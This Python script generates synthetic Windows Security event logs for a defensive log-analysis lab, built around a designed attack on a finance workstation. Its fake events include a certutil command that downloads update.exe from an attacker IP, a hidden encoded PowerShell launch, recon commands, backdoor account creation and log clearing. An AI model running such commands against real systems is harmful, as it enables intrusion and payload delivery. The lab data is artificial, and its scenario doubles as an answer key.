#!/usr/bin/env python3
###############################################################################
# generate_data.py — Windows Event Log Analysis lab data generator
#
# Produces a single JSON-ARRAY file:  security_events.json
#   index      = wineventlog
#   sourcetype = WinEventLog:Security
#
# One event = one flat JSON object. Field names mirror the raw Windows
# Security log EventData (EventID/Computer/SubjectUserName/TargetUserName/
# IpAddress/LogonType/NewProcessName/CommandLine/ParentProcessName/...).
#
# DESIGNED ATTACK SCENARIO (see questions in seed.json):
#   The finance workstation FIN-WS07 is targeted from an external IP.
#   1. Brute force (4625) against multiple usernames from 203.0.113.66
#   2. Successful network logon (4624, Type 3) of the targeted account
#   3. Special-privilege logon (4672) for the same account
#   4. LOLBin process creation (4688): cmd -> certutil download + powershell
#   5. Persistence: new local account created (4720) by the compromised user
#   6. Privilege escalation: that account added to a privileged group (4732)
#   7. RDP lateral movement (4624, Type 10) to a server
#   8. Anti-forensics: Security log cleared (1102)
# Plus realistic NOISE: normal interactive/network logons, routine processes,
# a benign vuln-scanner producing failed logons, backup service account logons.
#
# Deterministic — seeded RNG, so counts are exact and reproducible.
###############################################################################
import json
import random
import datetime
import sys

random.seed(20260608)

OUTDIR = sys.argv[1] if len(sys.argv) > 1 else "."
base_time = datetime.datetime(2026, 6, 5, 8, 0, 0)

# ── Shared IOCs / entities ───────────────────────────────────────────────────
ATTACKER_IP   = "203.0.113.66"     # external brute-force / C2 source
SCANNER_IP    = "10.10.20.250"     # benign vuln scanner (false positive)
BACKUP_SRV_IP = "10.10.20.200"     # backup server (benign service logons)

DOMAIN          = "CORP"
COMPROMISED_HOST = "FIN-WS07"      # finance workstation, initial foothold
LATERAL_HOST     = "SRV-APP02"     # server reached via RDP lateral movement

# the targeted / cracked account
TARGET_ACCOUNT  = "dkhalifa"
BACKDOOR_ACCOUNT = "svc_helpdesk"  # attacker-created persistence account
PRIV_GROUP      = "Administrators"

HOSTS = ["FIN-WS07", "HR-WS02", "IT-WS11", "SRV-APP02", "SRV-FILE01", "DC01"]
NORMAL_IPS = [f"10.10.20.{i}" for i in range(10, 60)]
NORMAL_ACCOUNTS = ["dkhalifa", "mraza", "afarrell", "lchen", "kobrien", "swilliams"]
SERVICE_ACCOUNTS = ["svc_backup", "svc_sql", "svc_monitor"]
BRUTE_USERNAMES = ["administrator", "admin", "dkhalifa", "dkhalifa", "guest", "sqladmin"]

events = []


def ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000Z")


# =====================================================================
# TRUE POSITIVE — the designed attack chain
# =====================================================================

# ── Phase 1: Brute force — 38 failed logons (4625) from ATTACKER_IP ──────────
brute_start = base_time + datetime.timedelta(hours=6, minutes=22)
BRUTE_FAIL_COUNT = 38
for i in range(BRUTE_FAIL_COUNT):
    t = brute_start + datetime.timedelta(seconds=i * 5 + random.randint(0, 2))
    events.append({
        "EventID": 4625,
        "EventTime": ts(t),
        "Computer": COMPROMISED_HOST,
        "Channel": "Security",
        "TaskCategory": "Logon",
        "SubjectUserName": "-",
        "TargetUserName": random.choice(BRUTE_USERNAMES),
        "TargetDomainName": DOMAIN,
        "LogonType": 3,
        "IpAddress": ATTACKER_IP,
        "IpPort": random.randint(49152, 65535),
        "Status": "0xC000006D",
        "SubStatus": "0xC000006A",
        "FailureReason": "Unknown user name or bad password.",
        "LogonProcessName": "NtLmSsp",
        "AuthenticationPackageName": "NTLM",
    })

# ── Phase 2: Successful network logon (4624 Type 3) — cracked account ────────
t_success = brute_start + datetime.timedelta(minutes=4, seconds=10)
events.append({
    "EventID": 4624,
    "EventTime": ts(t_success),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Logon",
    "SubjectUserName": "-",
    "TargetUserName": TARGET_ACCOUNT,
    "TargetDomainName": DOMAIN,
    "LogonType": 3,
    "IpAddress": ATTACKER_IP,
    "IpPort": random.randint(49152, 65535),
    "LogonProcessName": "NtLmSsp",
    "AuthenticationPackageName": "NTLM",
})

# ── Phase 3: Special privileges assigned to new logon (4672) ─────────────────
t_priv = t_success + datetime.timedelta(seconds=1)
events.append({
    "EventID": 4672,
    "EventTime": ts(t_priv),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Special Logon",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
    "PrivilegeList": "SeSecurityPrivilege SeBackupPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege",
})

# ── Phase 4: LOLBin process creation chain (4688) on FIN-WS07 ────────────────
chain = t_success + datetime.timedelta(seconds=20)
# cmd.exe spawned
events.append({
    "EventID": 4688,
    "EventTime": ts(chain),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Process Creation",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c certutil -urlcache -split -f http://203.0.113.66/update.exe %TEMP%\\update.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
})
# certutil download (LOLBin)
events.append({
    "EventID": 4688,
    "EventTime": ts(chain + datetime.timedelta(seconds=2)),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Process Creation",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
    "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil -urlcache -split -f http://203.0.113.66/update.exe C:\\Users\\dkhalifa\\AppData\\Local\\Temp\\update.exe",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
})
# powershell encoded
events.append({
    "EventID": 4688,
    "EventTime": ts(chain + datetime.timedelta(seconds=6)),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Process Creation",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
})
# recon LOLBins
for off, cmd, img in [
    (10, "whoami /all", "C:\\Windows\\System32\\whoami.exe"),
    (14, "net user", "C:\\Windows\\System32\\net.exe"),
    (18, "net localgroup administrators", "C:\\Windows\\System32\\net.exe"),
    (22, "ipconfig /all", "C:\\Windows\\System32\\ipconfig.exe"),
]:
    events.append({
        "EventID": 4688,
        "EventTime": ts(chain + datetime.timedelta(seconds=off)),
        "Computer": COMPROMISED_HOST,
        "Channel": "Security",
        "TaskCategory": "Process Creation",
        "SubjectUserName": TARGET_ACCOUNT,
        "SubjectDomainName": DOMAIN,
        "NewProcessName": img,
        "CommandLine": cmd,
        "ParentProcessName": "C:\\Users\\dkhalifa\\AppData\\Local\\Temp\\update.exe",
    })

# ── Phase 5: Persistence — new account created (4720) ────────────────────────
t_create = chain + datetime.timedelta(minutes=2)
events.append({
    "EventID": 4720,
    "EventTime": ts(t_create),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "User Account Management",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
    "TargetUserName": BACKDOOR_ACCOUNT,
    "TargetDomainName": COMPROMISED_HOST,
})

# ── Phase 6: Priv-esc — backdoor added to Administrators (4732) ──────────────
t_addgrp = t_create + datetime.timedelta(seconds=8)
events.append({
    "EventID": 4732,
    "EventTime": ts(t_addgrp),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Security Group Management",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
    "TargetUserName": BACKDOOR_ACCOUNT,
    "GroupName": PRIV_GROUP,
    "GroupDomain": "Builtin",
})

# ── Phase 7: RDP lateral movement (4624 Type 10) to SRV-APP02 ────────────────
t_rdp = t_addgrp + datetime.timedelta(minutes=3)
events.append({
    "EventID": 4624,
    "EventTime": ts(t_rdp),
    "Computer": LATERAL_HOST,
    "Channel": "Security",
    "TaskCategory": "Logon",
    "SubjectUserName": "-",
    "TargetUserName": BACKDOOR_ACCOUNT,
    "TargetDomainName": COMPROMISED_HOST,
    "LogonType": 10,
    "IpAddress": "10.10.20.27",   # FIN-WS07's internal IP (pivot)
    "IpPort": random.randint(49152, 65535),
    "LogonProcessName": "User32",
    "AuthenticationPackageName": "Negotiate",
})

# ── Phase 8: Anti-forensics — Security log cleared (1102) ────────────────────
t_clear = t_rdp + datetime.timedelta(minutes=6)
events.append({
    "EventID": 1102,
    "EventTime": ts(t_clear),
    "Computer": COMPROMISED_HOST,
    "Channel": "Security",
    "TaskCategory": "Log clear",
    "SubjectUserName": TARGET_ACCOUNT,
    "SubjectDomainName": DOMAIN,
})

# =====================================================================
# FALSE POSITIVES / benign-but-noisy
# =====================================================================

# Benign vuln scanner — 12 failed logons from SCANNER_IP (fewer than the attack)
scan_start = base_time + datetime.timedelta(hours=2)
for i in range(12):
    t = scan_start + datetime.timedelta(seconds=i * 30)
    events.append({
        "EventID": 4625,
        "EventTime": ts(t),
        "Computer": random.choice(HOSTS[:3]),
        "Channel": "Security",
        "TaskCategory": "Logon",
        "SubjectUserName": "-",
        "TargetUserName": "svc_scan",
        "TargetDomainName": DOMAIN,
        "LogonType": 3,
        "IpAddress": SCANNER_IP,
        "IpPort": random.randint(49152, 65535),
        "Status": "0xC000006D",
        "SubStatus": "0xC000006A",
        "FailureReason": "Unknown user name or bad password.",
        "LogonProcessName": "NtLmSsp",
        "AuthenticationPackageName": "NTLM",
    })

# Benign backup service account network logons (Type 3) each morning
for day in range(2):
    t = base_time + datetime.timedelta(days=day, hours=1)
    for tgt in ["SRV-FILE01", "DC01"]:
        events.append({
            "EventID": 4624,
            "EventTime": ts(t),
            "Computer": tgt,
            "Channel": "Security",
            "TaskCategory": "Logon",
            "SubjectUserName": "-",
            "TargetUserName": "svc_backup",
            "TargetDomainName": DOMAIN,
            "LogonType": 3,
            "IpAddress": BACKUP_SRV_IP,
            "IpPort": random.randint(49152, 65535),
            "LogonProcessName": "Kerberos",
            "AuthenticationPackageName": "Kerberos",
        })

# =====================================================================
# NORMAL BACKGROUND NOISE
# =====================================================================

# Background authentication (4624 success / 4625 fail) — never from ATTACKER_IP
for i in range(1800):
    offset = random.randint(0, 172800)  # within 2 days
    t = base_time + datetime.timedelta(seconds=offset)
    ec = random.choices([4624, 4625], weights=[94, 6])[0]
    lt = random.choice([2, 3, 3, 3, 7, 10])
    acct = random.choice(NORMAL_ACCOUNTS + SERVICE_ACCOUNTS)
    # Successful interactive/unlock logons (Type 2/7) have no remote source IP.
    # Failed logons (4625) always record a source workstation IP in the real
    # Security log, so give them a normal internal IP — never "-".
    if ec == 4625:
        ip = random.choice(NORMAL_IPS)
    else:
        ip = "-" if lt in (2, 7) else random.choice(NORMAL_IPS)
    ev = {
        "EventID": ec,
        "EventTime": ts(t),
        "Computer": random.choice(HOSTS),
        "Channel": "Security",
        "TaskCategory": "Logon",
        "SubjectUserName": "-",
        "TargetUserName": acct,
        "TargetDomainName": DOMAIN,
        "LogonType": lt,
        "IpAddress": ip,
        "IpPort": random.randint(49152, 65535) if ip != "-" else 0,
    }
    if ec == 4624:
        ev["LogonProcessName"] = random.choice(["Kerberos", "NtLmSsp", "Negotiate"])
        ev["AuthenticationPackageName"] = random.choice(["Kerberos", "NTLM"])
    else:
        ev["Status"] = "0xC000006D"
        ev["SubStatus"] = "0xC000006A"
        ev["FailureReason"] = "Unknown user name or bad password."
    events.append(ev)

# Background special-privilege logons (4672) for admins/service accounts (benign)
for i in range(60):
    offset = random.randint(0, 172800)
    t = base_time + datetime.timedelta(seconds=offset)
    events.append({
        "EventID": 4672,
        "EventTime": ts(t),
        "Computer": random.choice(HOSTS),
        "Channel": "Security",
        "TaskCategory": "Special Logon",
        "SubjectUserName": random.choice(["svc_backup", "svc_sql", "afarrell"]),
        "SubjectDomainName": DOMAIN,
        "PrivilegeList": "SeSecurityPrivilege SeBackupPrivilege",
    })

# Background process creation (4688) — routine binaries, benign parents
normal_procs = [
    ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\userinit.exe"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\taskhostw.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\conhost.exe", "C:\\Windows\\System32\\cmd.exe"),
]
for i in range(900):
    offset = random.randint(0, 172800)
    t = base_time + datetime.timedelta(seconds=offset)
    img, par = random.choice(normal_procs)
    events.append({
        "EventID": 4688,
        "EventTime": ts(t),
        "Computer": random.choice(HOSTS),
        "Channel": "Security",
        "TaskCategory": "Process Creation",
        "SubjectUserName": random.choice(NORMAL_ACCOUNTS),
        "SubjectDomainName": DOMAIN,
        "NewProcessName": img,
        "CommandLine": img,
        "ParentProcessName": par,
    })

# =====================================================================
# Write JSON array (sorted by time)
# =====================================================================
events.sort(key=lambda e: e["EventTime"])
out_path = f"{OUTDIR}/security_events.json"
with open(out_path, "w") as f:
    json.dump(events, f, indent=2)

print(f"[+] Wrote {len(events)} events to {out_path}")
